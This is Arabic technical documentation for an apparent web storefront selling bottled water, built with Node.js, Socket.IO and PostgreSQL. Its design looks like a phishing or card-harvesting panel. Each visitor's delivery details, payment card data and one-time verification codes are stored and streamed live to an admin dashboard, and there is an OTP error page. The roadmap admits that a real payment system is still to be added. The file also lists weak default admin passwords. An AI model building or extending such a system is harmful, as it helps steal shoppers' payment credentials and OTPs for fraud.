# نظام مياه واحة عمان - الوثائق التقنية الشاملة

## 1. نظرة عامة على النظام (System Overview)

هذا المشروع هو نظام متجر إلكتروني متكامل لمياه واحة عمان، يتضمن:
- **Frontend**: تطبيق ويب HTML/CSS/JS مع لوحة تحكم للأدمن
- **Backend**: خادم Node.js مع Express.js و Socket.IO
- **Database**: قاعدة بيانات PostgreSQL (Neon Cloud)
- **Real-time**: اتصالات WebSocket للتتبع الفوري للزوار

---

## 2. هيكل المشروع (Project Structure)

```
wahatqatar/
├── backend/
│   ├── config/
│   │   └── database.js       # إعدادات الاتصال بقاعدة البيانات
│   ├── models/
│   │   └── schema.js         # تعريف جداول قاعدة البيانات
│   ├── routes/
│   │   ├── admin.js          # مسارات لوحة التحكم (API)
│   │   ├── products.js       # مسارات المنتجات (API)
│   │   └── visitors.js       # مسارات الزوار (API)
│   ├── server.js             # الخادم الرئيسي + Socket.IO
│   ├── package.json
│   └── uploads/              # ملفات مرفوعة مؤقتاً
│
├── frontend/
│   ├── admin/
│   │   ├── index.html        # صفحة لوحة التحكم
│   │   ├── admin.js          # منطق لوحة التحكم
│   │   └── admin.css         # تنسيق لوحة التحكم
│   ├── css/
│   │   └── style.css         # تنسيق الموقع الرئيسي
│   ├── js/
│   │   └── main.js           # منطق الموقع الرئيسي
│   ├── pages/
│   │   ├── delivery.html     # صفحة بيانات التوصيل
│   │   ├── payment.html       # صفحة بيانات الدفع
│   │   ├── verification.html  # صفحة التحقق (OTP)
│   │   ├── product.html       # صفحة المنتج
│   │   ├── select.html        # صفحة الاختيار
│   │   └── errorotp.html      # صفحة خطأ OTP
│   └── index.html             # الصفحة الرئيسية
│
├── schema.sql                 # ملف قاعدة البيانات الموحد
├── deployment.md              # دليل النشر
└── README.md
```

---

## 3. دورة حياة البيانات (Data Lifecycle)

### 3.1 دخول الزائر (Visitor Entry)

```
الزائر يفتح الموقع
        ↓
    server.js
    ├─ إنشاء sessionId فريد (uuid)
    ├─ استخراج IP من headers
    ├─ استخراج User-Agent
    ├─ تحديد البلد باستخدام geoip-lite
    ↓
    INSERT INTO visitors (session_id, ip_address, country, ...)
```

### 3.2 حفظ بيانات الزائر (Visitor Data Storage)

**الجدول: `visitors`**

| الحقل | النوع | الوصف |
|-------|------|-------|
| id | SERIAL | مفتاح أساسي |
| session_id | VARCHAR(100) | معرف الجلسة الفريد |
| ip_address | VARCHAR(45) | عنوان IP |
| country | VARCHAR(100) | البلد |
| country_code | VARCHAR(10) | رمز البلد |
| user_agent | TEXT | معلومات المتصفح |
| current_page | VARCHAR(100) | الصفحة الحالية |
| is_online | BOOLEAN | هل الزائر متصل |
| visit_status | VARCHAR(20) | حالة الزيارة (online/idle/offline) |
| delivery_data | JSONB | بيانات التوصيل |
| payment_data | JSONB | بيانات الدفع |
| verification_data | JSONB | بيانات التحقق |
| otp_history | JSONB | سجل OTP |
| form_submitted | BOOLEAN | هل أكمل نموذج التوصيل |
| payment_submitted | BOOLEAN | هل أكمل نموذج الدفع |
| verification_submitted | BOOLEAN | هل أكمل التحقق |
| last_activity | TIMESTAMP | آخر نشاط |
| created_at | TIMESTAMP | تاريخ الإنشاء |

### 3.3 إرسال البيانات للوحة التحكم (Admin Dashboard)

**آلية WebSocket (Socket.IO):**

```
┌─────────────┐                    ┌─────────────┐
│   Visitor   │ ─── Socket ────> │   Server   │
│   Browser   │                    │  (server.js)│
└─────────────┘                    └──────┬──────┘
                                          │
                                          │ emit('visitor:new')
                                          │ emit('visitor:pageChange')
                                          │ emit('visitor:update')
                                          ↓
                                   ┌─────────────┐
                                   │ Admin Panel │
                                   │  (admin.js)  │
                                   └─────────────┘
```

**الأحداث (Events):**

| الحدث | المرسل | المستقبل | الوصف |
|-------|--------|----------|-------|
| `visitor:init` | الزائر | Server | تهيئة الزائر |
| `visitor:new` | Server | Admin | زائر جديد |
| `visitor:page` | الزائر | Server | تغيير الصفحة |
| `visitor:pageChange` | Server | Admin | تنبيه تغيير الصفحة |
| `form:delivery` | الزائر | Server | إرسال بيانات التوصيل |
| `form:payment` | الزائر | Server | إرسال بيانات الدفع |
| `form:verification` | الزائر | Server | إرسال التحقق |
| `visitor:update` | Server | Admin | تحديث بيانات الزائر |
| `visitor:statusChange` | Server | Admin | تغيير حالة الاتصال |

---

## 4. نظام التوثيق (Authentication System)

### 4.1 أنواع التوثيق

```
┌────────────────────────────────────────────────────────────┐
│                    نظام التوثيق                             │
├────────────────────────────────────────────────────────────┤
│  1. Admin Authentication (لوحة التحكم)                     │
│     ├─ تسجيل الدخول عبر HTTP POST /api/admin/login         │
│     ├─ التحقق من كلمة المرور (bcrypt)                       │
│     ├─ إنشاء session token في admin_sessions               │
│     └─ إرسال token للعميل عبر socket.emit                  │
│                                                            │
│  2. Socket Authentication (Socket.IO)                       │
│     ├─ التحقق من token في handshake.auth.token             │
│     ├─ التحقق من صلاحية الجلسة في قاعدة البيانات           │
│     └─ تعيين socket.isAdmin = true/false                   │
│                                                            │
│  3. Visitor Tracking (تتبع الزوار)                          │
│     ├─ إنشاء sessionId عشوائي                               │
│     ├─ تتبع بدون توثيق (للإحصائيات فقط)                    │
│     └─ التحقق من الحظر (banned_users)                      │
└────────────────────────────────────────────────────────────┘
```

### 4.2 جدول الأدمن (admins)

| الحقل | النوع | الوصف |
|-------|------|-------|
| id | SERIAL | مفتاح أساسي |
| username | VARCHAR(100) | اسم المستخدم |
| password_hash | VARCHAR(255) | كلمة المرور (bcrypt) |
| is_active | BOOLEAN | هل الحساب نشط |
| created_at | TIMESTAMP | تاريخ الإنشاء |
| updated_at | TIMESTAMP | آخر تحديث |

### 4.3 جدول جلسات الأدمن (admin_sessions)

| الحقل | النوع | الوصف |
|-------|------|-------|
| id | SERIAL | مفتاح أساسي |
| session_token | VARCHAR(100) | رمز الجلسة |
| device_info | JSONB | معلومات الجهاز |
| ip_address | VARCHAR(45) | عنوان IP |
| country | VARCHAR(100) | البلد |
| is_current | BOOLEAN | هل هذه الجلسة الحالية |
| last_activity | TIMESTAMP | آخر نشاط |
| created_at | TIMESTAMP | تاريخ الإنشاء |
| expires_at | TIMESTAMP | تاريخ انتهاء الجلسة (10 ساعات) |

### 4.4 التحقق من الحظر (banned_users)

| الحقل | النوع | الوصف |
|-------|------|-------|
| id | SERIAL | مفتاح أساسي |
| session_id | VARCHAR(100) | معرف الجلسة المحظور |
| ip_address | VARCHAR(45) | IP المحظور |
| reason | TEXT | سبب الحظر |
| custom_message | TEXT | رسالة مخصصة |
| banned_by | INTEGER | الأدمن الذي أصدر الحظر |
| created_at | TIMESTAMP | تاريخ الحظر |
| expires_at | TIMESTAMP | تاريخ انتهاء الحظر (nullable) |

---

## 5. قواعد البيانات (Database Schema)

### 5.1 جداول قاعدة البيانات

```
┌─────────────────────────────────────────────────────────────┐
│                        قاعدة البيانات                         │
├─────────────────────────────────────────────────────────────┤
│  1. products - المنتجات                                      │
│  2. visitors - الزوار                                        │
│  3. sessions - الجلسات                                       │
│  4. orders - الطلبات                                        │
│  5. form_submissions - إرسال النماذج                         │
│  6. admins - الأدمن                                          │
│  7. admin_sessions - جلسات الأدمن                           │
│  8. banned_users - المستخدمين المحظورين                      │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 العلاقات (Relationships)

```
admins ─────┬─────< admin_sessions (1:N)
            │
            └─────< banned_users (1:N)

visitors ───┴──< sessions (1:N)
      │
      ├─────< orders (1:N)
      ├─────< form_submissions (1:N)
      │
      └─────< banned_users (via session_id, ip_address)
```

---

## 6. واجهة برمجة التطبيقات (API Endpoints)

### 6.1 منتجات (/api/products)

| الطريقة | المسار | الوصف |
|---------|--------|-------|
| GET | / | جلب جميع المنتجات النشطة |
| GET | /:id | جلب منتج واحد |
| POST | / | إنشاء منتج جديد |
| PUT | /:id | تحديث منتج |
| DELETE | /:id | حذف منتج (soft delete) |
| POST | /upload | رفع صورة |

### 6.2 أدمن (/api/admin)

| الطريقة | المسار | الوصف |
|---------|--------|-------|
| POST | /login | تسجيل الدخول |
| POST | /change-password | تغيير كلمة المرور |
| GET | /admins | جلب جميع الأدمن |
| POST | /admins | إنشاء أدمن جديد |
| GET | /banned | جلب المحظورين |
| DELETE | /banned/:id | إلغاء الحظر |
| GET | /stats | الإحصائيات |
| GET | /sessions | جلب جلسات الأدمن |
| DELETE | /sessions/:token | حذف جلسة |
| DELETE | /sessions | حذف جميع الجلسات |

### 6.3 زوار (/api/visitors)

| الطريقة | المسار | الوصف |
|---------|--------|-------|
| GET | / | جلب جميع الزوار |
| GET | /:sessionId | جلب زائر واحد |
| GET | /check-ban/:sessionId | فحص الحظر |

---

## 7. أحداث Socket.IO (Socket Events)

### 7.1 أحداث الزوار (Visitor Events)

| الحدث | الاتجاه | الوصف |
|-------|---------|-------|
| `visitor:init` | Client → Server | تهيئة زائر جديد |
| `visitor:confirmed` | Server → Client | تأكيد التهيئة |
| `visitor:page` | Client → Server | تحديث الصفحة الحالية |
| `user:banned` | Server → Client | تنبيه الحظر |

### 7.2 أحداث الأدمن (Admin Events)

| الحدث | الاتجاه | الوصف |
|-------|---------|-------|
| `admin:login` | Client → Server | تسجيل دخول الأدمن |
| `admin:valid` | Server → Client | نتيجة التحقق من الجلسة |
| `admin:validate` | Client → Server | التحقق من صلاحية الجلسة |
| `admin:logout` | Client → Server | تسجيل الخروج |
| `admin:logoutDevice` | Client → Server | تسجيل خروج جهاز |
| `admin:logoutAll` | Client → Server | تسجيل خروج جميع الأجهزة |
| `admin:devices` | Client → Server | طلب قائمة الأجهزة |
| `admin:devicesList` | Server → Client | قائمة الأجهزة |
| `admin:forceLogout` | Server → Client | إجبار الخروج |

### 7.3 أحداث الزوار للأدمن (Visitor Events for Admin)

| الحدث | الاتجاه | الوصف |
|-------|---------|-------|
| `visitor:new` | Server → Admin | زائر جديد |
| `visitor:pageChange` | Server → Admin | تغيير صفحة زائر |
| `visitor:update` | Server → Admin | تحديث بيانات زائر |
| `visitor:statusChange` | Server → Admin | تغيير حالة الاتصال |
| `visitors:update` | Server → Admin | تحديث جميع الزوار |
| `visitors:request` | Admin → Server | طلب قائمة الزوار |
| `stats:request` | Admin → Server | طلب الإحصائيات |

---

## 8. متغيرات البيئة (Environment Variables)

```env
# قاعدة البيانات
DATABASE_URL=postgresql://user:pass@host/database?sslmode=require

# خادم
PORT=3000

# أمان
ADMIN_DEFAULT_PASSWORD=admin123
ADMIN_PASSWORD=secret123

# ملفات
UPLOAD_DIR=./uploads
MAX_FILE_SIZE=5242880
```

---

## 9. الاعتبارات الأمنية (Security Considerations)

### 9.1 نقاط الضعف المحتملة

1. **CORS**: مسموح لجميع المصادر (`origin: '*'`)
2. **Token Validation**: التحقق من token بسيط جداً
3. **Rate Limiting**: غير مطبق
4. **Input Sanitization**: غير مطبق بشكل كامل

### 9.2 التوصيات

- تطبيق HTTPS في الإنتاج
- إضافة rate limiting
- تحسين التحقق من token
- إضافة input sanitization
- تفعيل CORS بشكل انتقائي

---

## 10. مستقبل التطوير (Future Improvements)

- [ ] إضافة نظام دفع حقيقي
- [ ] إضافة نظام إشعارات Push
- [ ] تحسين لوحة التحكم
- [ ] إضافة تقارير وإحصائيات متقدمة
- [ ] تطبيق PWA للجوال
